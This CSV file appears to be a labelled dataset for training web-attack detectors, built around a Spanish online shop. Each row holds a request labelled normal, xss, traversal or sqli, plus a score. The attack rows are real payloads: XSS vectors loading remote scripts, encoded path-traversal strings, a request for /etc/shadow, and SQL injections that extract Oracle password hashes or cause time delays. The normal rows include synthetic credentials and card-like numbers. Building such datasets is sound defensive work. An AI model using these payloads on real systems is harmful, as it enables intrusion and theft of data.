miembros/imagenes/ogono.jpg,normal,0.400604245
imagenes/3.gif,normal,0.999481179
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.004541971
"<a href=""javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.348736169
publico/caracteristicas.jsp?id=2,normal,0.762219399
..%252f..%252f..%252f..%252f{FILE},traversal,0.092143284
%uff0e%uff0e%u2216{FILE},traversal,0.804151788
miembros/imagenes/zarauz.jpg,normal,0.439722345
miembros/imagenes/ogono.jpg,normal,0.484133895
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=33&B1=A%F1adir+al+carrito,normal,0.901988297
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser,xss,0.573525244
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.33186676
publico/pagar.jsp?modo=insertar&precio=7634&B1=Confirmar,normal,0.355644011
publico/productos.jsp,normal,0.454380699
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.049475652
"perl -e 'print \""<SCR\0IPT>alert(\""XSS\"")</SCR\0IPT>\"";' > out",xss,0.695249434
imagenes/2.gif,normal,0.977531255
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>",xss,0.48930651
miembros/imagenes/castro.jpg,normal,0.582069488
publico/autenticar.jsp?modo=entrar&login=kaycee&pwd=Ro3eraL&remember=on&B1=Entrar,normal,0.148065912
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,0.945724231
imagenes/nuestratierra.jpg,normal,0.200224231
%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,traversal,0.444420366
"""`'><script>\xE2\x80\x88javascript:alert(1)</script>",xss,0.028543902
"<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss,0.672281937
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE},traversal,0.98138352
" <HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss,0.866331342
imagenes/1.gif,normal,0.143312854
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE},traversal,0.179278596
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss,0.032635143
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",xss,0.704264304
imagenes/cmenbul.gif,normal,0.335818249
publico/caracteristicas.jsp?id=1,normal,0.110439802
"ABC<div style=""x:\xE2\x80\x81expression(javascript:alert(1)"">DEF",xss,0.896305362
publico/pagar.jsp?modo=insertar&precio=8664&B1=Confirmar,normal,0.945486433
<;SCRIPT SRC=http://ha.ckers.org/xss.js,xss,0.51551443
imagenes/1.gif,normal,0.644671567
publico/productos.jsp,normal,0.794041662
"s&.on: select * from users where id='1' or \.<$ union select 1,@@VERSION -- 1'",sqli,0.934527409
miembros/imagenes/zarauz.jpg,normal,0.318324901
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE,xss,0.80701887
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.022950473
<;IMG SRC=javascript:alert(';XSS';)>;,xss,0.18892266
"<img\x10src=x onerror=""javascript:alert(1)"">",xss,0.698887955
..///..///..///..///..///..///{FILE},traversal,0.710007137
"<meta http-equiv=""refresh"" content=""0;url=javascript:document.vulnerable=true;"">",xss,0.844995962
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},xss,0.011551075
global/titulo.jsp,normal,0.03610814
&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;,xss,0.903325879
"&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",xss,0.148222281
imagenes/2.gif,normal,0.289911196
publico/productos.jsp,normal,0.749794098
imagenes/logo.gif,normal,0.799418595
publico/autenticar.jsp?modo=entrar&login=baudoin&pwd=destullecer&remember=on&B1=Entrar,normal,0.549303962
miembros/imagenes/castro.jpg,normal,0.15113323
"s??s: select * from users where id=1 or ""??"" or 1=1 -- 1",sqli,0.674842611
imagenes/1.gif,normal,0.099060203
imagenes/1.gif,normal,0.154295698
"<a href=""\x13javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.502832447
///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},traversal,0.068361061
"<object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object> <object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""javascript:alert(1)"" style=""behavior:url(#x);""><param name=postdomevents /></object>",xss,0.99787314
“><s”%2b”cript>alert(document.cookie)</script>,xss,0.129125588
.\..\{FILE},traversal,0.272002979
index.jsp,normal,0.827499017
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.544823007
miembros/index.jsp,normal,0.630292416
<script>javascript:alert(1)</script\x0B,xss,0.582110728
global/menum.jsp,normal,0.009197902
global/creditos.jsp,normal,0.21633121
global/menum.jsp,normal,0.305782068
\\\%2e%2e%5c{FILE},traversal,0.711887785
global/creditos.jsp,normal,0.401177895
miembros/editar.jsp?modo=registro&login=poseidon6&password=pasote&nombre=Braian&apellidos=Porro&email=kristl%40voragolive.vn&dni=20061667D&direccion=C%2F+Torre+De+Romo+S%2FN+1F&ciudad=Gines&cp=21700&provincia=Alicante&ntc=1819477389412406&B1=Registrar,normal,0.717972941
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},traversal,0.123349261
global/menum.jsp,normal,0.312015923
"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",xss,0.965213098
"s?n: select * from users where id=1 or ""?["" or 1=1 -- 1",sqli,0.533908505
miembros/editar.jsp?modo=registro&login=naresh&password=72nt89CT7V1&nombre=Eulalio&apellidos=Escudero+Ostria&email=gorse%4016horas.yu&dni=86274990N&direccion=Calle+Fermin+Salvochea+155+&ciudad=Alcolea+del+Pinar&cp=14230&provincia=Teruel&ntc=0981560265462116&B1=Registrar,normal,0.792606846
imagenes/2.gif,normal,0.138189145
&#x03C,xss,0.620090376
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal,0.998633219
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"";>;",xss,0.521086833
or 1=1#,sqli,0.009198816
<body oninput=javascript:alert(1)><input autofocus>,xss,0.531742641
miembros/imagenes/zarauz.jpg,normal,0.877918277
..\\\..\\\..\\\{FILE},traversal,0.806006867
imagenes/cmenbul.gif,normal,0.977635149
"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF ",xss,0.333873147
imagenes/3.gif,normal,0.907809301
miembros/imagenes/ogono.jpg,normal,0.70871956
..%255c..%255c..%255c..%255c{FILE},traversal,0.525768554
miembros/imagenes/zarauz.jpg,normal,0.12114685
"<div/style=""width:expression(confirm(1))"">X</div> {IE7}",xss,0.058001036
%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE},traversal,0.129561117
index.jsp,normal,0.126552539
publico/registro.jsp?modo=registro&login=jean-yve&password=reTEjAdOR&nombre=Cancia&apellidos=O%27Kinghtons+Camarena&email=olrich-shapiro1%40nuriamartin.aw&dni=97060354D&direccion=Senda+Buen+Paso+S%2FN%2C+&ciudad=Luesia&cp=22390&provincia=Asturias&ntc=8267431025409914&B1=Registrar,normal,0.057754064
global/estilos.css,normal,0.531951975
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.675231008
imagenes/logo.gif,normal,0.673582106
<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>,xss,0.45869534
"<IMG SRC='vbscript:msgbox(""XSS"")'>",xss,0.438291364
"<IMG SRC=x oninput=""alert(String.fromCharCode(88,83,83))"">",xss,0.0886777
imagenes/1.gif,normal,0.85781673
miembros/imagenes/castro.jpg,normal,0.161154561
miembros/editar.jsp?modo=registro&login=xiaojing&password=coNtRadiCha&nombre=Iara&apellidos=Noya+Driu&email=milton%40diagnosticoradiologico.asia&dni=97426856Y&direccion=C%2F+Fuente+Pista+De+Tenis%2C+164+&ciudad=Aliseda&cp=40560&provincia=Le%F3n&ntc=5798582876895008&B1=Registrar,normal,0.51468085
"<img src\x13=x onerror=""javascript:alert(1)"">",xss,0.69595108
publico/pagar.jsp?modo=insertar&precio=9805&B1=Confirmar,normal,0.363587095
"<IMG SRC=x onload=""alert(String.fromCharCode(88,83,83))"">",xss,0.092533527
<input onblur=javascript:alert(1) autofocus><input autofocus>,xss,0.631540653
miembros/imagenes/ogono.jpg,normal,0.391084495
exec(@s),sqli,0.165380578
"""`'><script>\xE2\x80\x87javascript:alert(1)</script>",xss,0.152388766
..%c0%af..%c0%af..%c0%af..%c0%af{FILE},traversal,0.037109831
..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},traversal,0.347680928
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=81&B1=A%F1adir+al+carrito,normal,0.88283218
imagenes/nuestratierra.jpg,normal,0.485374214
publico/productos.jsp,normal,0.15865827
miembros/imagenes/ogono.jpg,normal,0.345912263
"<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>",xss,0.977459355
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss,0.51374613
imagenes/cmenbul.gif,normal,0.018069174
..%2f..%2f..%2f..%2f..%2f{FILE},traversal,0.763401281
"<a href=""javascript:javascript:alert(1)""><event-source src=""data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"">",xss,0.189989121
miembros/salir.jsp,normal,0.129873705
publico/miembros.jsp,normal,0.004446111
imagenes/logo.gif,normal,0.082277757
<title onpropertychange=javascript:alert(1)></title><title title=>,xss,0.683823894
global/titulo.jsp,normal,0.411730072
imagenes/1.gif,normal,0.078555932
publico/miembros.jsp,normal,0.21038272
..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE},traversal,0.279447744
miembros/salir.jsp,normal,0.709229475
index.jsp,normal,0.068221905
../../../../../../{FILE},traversal,0.147833754
"sUE.c: select * from users where id='1' union select \.#,@@VERSION -- 1'",sqli,0.415947728
"&lt;IMG SRC=\""jav&#x0D;ascript&#058;alert('XSS');\""&gt;",xss,0.904840987
"<img\x13src=x onerror=""javascript:alert(1)"">",xss,0.55162847
global/creditos.jsp,normal,0.505770745
publico/productos.jsp,normal,0.613882771
"ABC<div style=""x:\xE2\x80\x88expression(javascript:alert(1)"">DEF",xss,0.794763191
publico/caracteristicas.jsp?id=2,normal,0.06853542
"<;A HREF="";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/"";>;XSS<;/A>;",xss,0.41611583
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE},traversal,0.214937801
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",xss,0.757504421
&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;,xss,0.731875868
imagenes/nuestratierra.jpg,normal,0.313877938
<;HTML xmlns:xss>;,xss,0.94828195
imagenes/nuestratierra.jpg,normal,0.263078828
miembros/editar.jsp?modo=registro&login=maxsom&password=2s323a657a679&nombre=Silvia&apellidos=Alfonso&email=szarabajka%40queinvento.si&dni=86464472C&direccion=C%2F+Ce%F1a%2C+107%2C+&ciudad=Cijuela&cp=22809&provincia=Navarra&ntc=5525531016614315&B1=Registrar,normal,0.956315571
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;,xss,0.36672046
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss,0.067831507
publico/autenticar.jsp?modo=entrar&login=aguistin&pwd=iNnota&remember=on&B1=Entrar,normal,0.275829239
publico/productos.jsp,normal,0.914445608
global/estilos.css,normal,0.148788203
"<frameset onFocus frameset onFocus=""javascript:javascript:alert(1)""></frameset onFocus>",xss,0.280206102
..\..\{FILE},traversal,0.192011264
imagenes/1.gif,normal,0.949628801
publico/miembros.jsp,normal,0.109159329
' or ''-',sqli,0.431644686
miembros/imagenes/castro.jpg,normal,0.710827116
publico/registro.jsp?modo=registro&login=omura5&password=cont5975614s74&nombre=Amelia&apellidos=Tolosa+Fontanet&email=boa4%40sitienesunawebtienesunnegocio.es&dni=00947908D&direccion=Calle+Arenys+De+Mar%2C+113%2C+&ciudad=Maials&cp=11690&provincia=Le%F3n&ntc=7627570556544379&B1=Registrar,normal,0.79639398
"UE(1): select * from users where id=1 union select (1),banner from v$version where rownum=1 -- 1",sqli,0.557888218
"<IMG SRC=# onmouseover=""alert('xxs')"">",xss,0.011920828
\\&apos;/bin/cat%20/etc/shadow\\&apos;,traversal,0.718090471
publico/productos.jsp,normal,0.964559542
imagenes/3.gif,normal,0.859593198
%2A%28%7C%28mail%3D%2A%29%29,sqli,0.795454226
miembros/imagenes/ogono.jpg,normal,0.250300064
"sn)s: select * from users where id=1 or ""_)"" or 1=1 -- 1",sqli,0.012007354
imagenes/nuestratierra.jpg,normal,0.764067494
miembros/imagenes/castro.jpg,normal,0.947290846
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal,0.436290289
"""/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />",xss,0.935838573
global/titulo.jsp,normal,0.566132369
imagenes/1.gif,normal,0.696970754
"<IMG SRC= onmouseover=""alert('xxs')"">",xss,0.025223118
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.175687724
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^,xss,0.67936119
publico/miembros.jsp,normal,0.457076126
imagenes/3.gif,normal,0.143600004
"<;HEAD>;<;META HTTP-EQUIV="";CONTENT-TYPE""; CONTENT="";text/html; charset=UTF-7"";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-",xss,0.868949621
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,0.707199936
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>,xss,0.206111492
miembros/imagenes/castro.jpg,normal,0.656686238
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i",sqli,0.453123421
global/estilos.css,normal,0.298188825
<img src=&{document.vulnerable=true;};>,xss,0.980778796
..%25c1%259c..%25c1%259c..%25c1%259c{FILE},traversal,0.048894044
o()&1: select * from users where id=1 %(\) or 1=1 -- 1,sqli,0.674284105
"<a href=""javas\x0Ccript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.655529503
' select name from syscolumns where id = (select id from sysobjects where name = tablename')--,sqli,0.227112646
imagenes/logo.gif,normal,0.528012294
"'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",sqli,0.706574327
publico/registro.jsp?modo=registro&login=riggsbee&password=cuart%F3n&nombre=Seliem&apellidos=Scoccia&email=steinfeld%40multireform.sg&dni=43751883H&direccion=C%2F+Sant+Gon%E7al+166+9-B&ciudad=Catoira&cp=10131&provincia=Barcelona&ntc=8179154437661538&B1=Registrar,normal,0.982523969
' or 'something' like 'some%',sqli,0.454964779
"<script src=1 href=1 onerror=""javascript:alert(1)""></script>",xss,0.563150783
global/menum.jsp,normal,0.180758798
admin') or '1'='1'--,sqli,0.728987324
imagenes/1.gif,normal,0.56727819
publico/autenticar.jsp?modo=entrar&login=choong&pwd=d1se3ci%F3n&remember=off&B1=Entrar,normal,0.660146615
global/menum.jsp,normal,0.818928849
.../.../.../.../.../.../.../{FILE},traversal,0.670788094
imagenes/nuestratierra.jpg,normal,0.720380711
handler,sqli,0.285196163
..%u2215..%u2215..%u2215..%u2215..%u2215{FILE},traversal,0.907503204
<script>var var = 1; alert(var)</script>,xss,0.408643256
<svg><script onlypossibleinopera:-)> alert(1),xss,0.200635544
publico/caracteristicas.jsp?id=1,normal,0.124946425
global/creditos.jsp,normal,0.057569173
publico/miembros.jsp,normal,0.682066542
imagenes/logo.gif,normal,0.222547696
..%2f..%2f{FILE},traversal,0.120071941
"<;A HREF="";http://0102.0146.0007.00000223/"";>;XSS<;/A>;",xss,0.397583464
imagenes/logo.gif,normal,0.702279216
<video poster=javascript:javascript:alert(1)//,xss,0.034907374
"<table background=""javascript:javascript:alert(1)"">",xss,0.202928501
